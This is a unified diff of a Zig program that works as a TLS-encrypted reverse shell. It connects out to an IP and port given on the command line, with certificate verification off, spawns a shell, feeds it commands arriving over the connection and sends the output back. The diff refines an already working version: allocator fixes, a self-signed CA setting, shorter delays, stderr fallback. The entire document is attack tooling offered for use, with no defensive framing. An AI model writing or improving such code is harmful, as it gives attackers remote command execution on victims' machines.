@@ -6,8 +6,9 @@ pub fn main() !void {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    const args = try std.process.argsAlloc(std.heap.page_allocator);
-    defer std.process.argsFree(std.heap.page_allocator, args);
+    const args = try std.process.argsAlloc(allocator);
+    defer std.process.argsFree(allocator, args);
+
     if (args.len != 3) {
         std.debug.print("Usage: {s} <IP> <PORT>\n", .{args[0]});
         return;
@@ -36,22 +37,20 @@ pub fn main() !void {
 
     std.debug.print("[+] Connecting to {s}:{d}\n", .{ target_hostname, target_port });
 
+    // Create TCP connection
     const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);
     defer address_list.deinit();
+
     const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
-        std.debug.print("[-] Host seems down. Cannot connect to the host.\n", .{});
+        std.debug.print("[-] Connection failed\n", .{});
         return;
     };
     defer stream.close();
 
-    // Create empty certificate bundle for no verification
-    var ca_bundle = std.crypto.Certificate.Bundle{};
-    defer ca_bundle.deinit(allocator);
-
-    // Initialize TLS client with both required fields
+    // Initialize TLS client
     var tls_client = std.crypto.tls.Client.init(stream, .{
         .host = .no_verification,
-        .ca = ca_bundle,
+        .ca = .self_signed,
     }) catch |err| {
         std.debug.print("[-] TLS initialization failed: {}\n", .{err});
         return;
@@ -59,40 +58,48 @@ pub fn main() !void {
 
     std.debug.print("[+] TLS connection established\n", .{});
 
+    // Start shell process
     var process = std.process.Child.init(shell, allocator);
     process.stdin_behavior = .Pipe;
     process.stdout_behavior = .Pipe;
     process.stderr_behavior = .Pipe;
+
     try process.spawn();
     defer _ = process.kill() catch {};
 
     var buffer: [4096]u8 = undefined;
 
+    // Main I/O loop - similar to your original working version
     while (true) {
-        // Read command from TLS socket
+        // Read command from TLS connection
         const bytes_read = tls_client.read(stream, &buffer) catch break;
         if (bytes_read == 0) break;
 
-        // Send command to process
+        // Send command to process stdin
         _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;
 
-        // Wait for execution
-        std.time.sleep(300 * std.time.ns_per_ms);
+        // Small delay to let command execute
+        std.time.sleep(100 * std.time.ns_per_ms);
 
-        // Read output once with reasonable timeout
-        if (process.stdout.?.read(&buffer)) |output_len| {
-            if (output_len > 0) {
-                _ = tls_client.writeAll(stream, buffer[0..output_len]) catch break;
+        // Try to read stdout first
+        if (process.stdout.?.read(&buffer)) |stdout_len| {
+            if (stdout_len > 0) {
+                _ = tls_client.writeAll(stream, buffer[0..stdout_len]) catch break;
             }
         } else |_| {
-            // If stdout fails, try stderr
-            if (process.stderr.?.read(&buffer)) |error_len| {
-                if (error_len > 0) {
-                    _ = tls_client.writeAll(stream, buffer[0..error_len]) catch break;
+            // If no stdout, try stderr
+            if (process.stderr.?.read(&buffer)) |stderr_len| {
+                if (stderr_len > 0) {
+                    _ = tls_client.writeAll(stream, buffer[0..stderr_len]) catch break;
                 }
-            } else |_| {}
+            } else |_| {
+                // If no output available, send a prompt or newline
+                _ = tls_client.writeAll(stream, "\n") catch break;
+            }
         }
     }
 
+    // Wait for process to finish
+    _ = process.wait() catch {};
     std.debug.print("[+] Session ended\n", .{});
 }
